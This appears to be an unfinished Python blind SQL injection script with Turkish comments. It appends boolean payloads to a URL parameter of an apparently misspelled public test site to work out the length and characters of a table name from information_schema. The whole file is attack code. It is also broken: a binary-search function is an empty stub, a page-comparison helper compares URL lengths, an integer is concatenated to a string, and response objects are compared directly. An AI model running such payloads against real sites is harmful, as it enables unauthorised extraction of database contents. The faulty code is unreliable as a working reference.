# -*- coding: utf-8 -*-
# BLIND SQL injection test
# KORAYY 190725
import requests

def find_table_length(url):
    found = False
    i = 3
    #TODO: sql_payload parametrik yap
    res = requests.get(url)
    while not found:
        sql_payload = " ((SELECT length(table_name) from " + \
                      " information_schema.tables where " + \
                      " table_schema=database() LIMIT 0,1) = " + \
                      str(i) + ")"
        vuln_url =  url + " and " + sql_payload
        vuln_res = requests.get(vuln_url)
        if len(vuln_res.text) == len(res.text):
            found = True
            #print("Found at", i)
            break
        i = i + 1
    return i

# iki sayfanın eş değerliliğini kontrol eder
def pages_equal(url1, url2):
    #TODO: sayfadaki bir string in olup olmadığına bakan
    #metod olsa daha generic olur //MEHMET INCE
    return len(url1) == len(url2)

def binarySearch(min, max, str_pos):
    #TODO:
    pass

def find_table_name(url, len_table):
    offset = 0
    table_length = find_table_length(url)
    #offset 1 artacak ama len_table boyutu kadar
    #oncesinde tablo length i bulunmali!
    #65 ile 122 arasi bakilacak
    ascii_min = 32
    ascii_max = 122
    table_name_str = ''

    res = requests.get(url)
    #while True:
    for i in range(table_length):
        str_pos = i + 1
        # tam ortada olabilir. guess imiz ascii_mid
        ascii_mid = round((ascii_min + ascii_max)/2)
        
        sql_payload = "ascii(substring( (SELECT table_name from " + \
                                        "information_schema.tables " + \
                                        "where table_schema=database() " + \
                                        "LIMIT " + str(offset) + ",1), " +  \
                                         str_pos + ", 1))" + \
                                        ">" + str(ascii_mid)
        

        vuln_url = url + " and " + sql_payload 

        
        vuln_res = requests.get(vuln_url)
        
        # > ascii_mid durumu
        if res == vuln_res:
            ascii_min = ascii_mid
        # < ascii_mid durumu
        else:
            ascii_max = ascii_mid

        #if ascii_min - 
        

    #print(len(res.text))
    #print(len(vuln_res.text))


url = "http://estphp.vulnweb.com/product.php?pic=1"
len_table = find_table_length(url)
print(len_table)
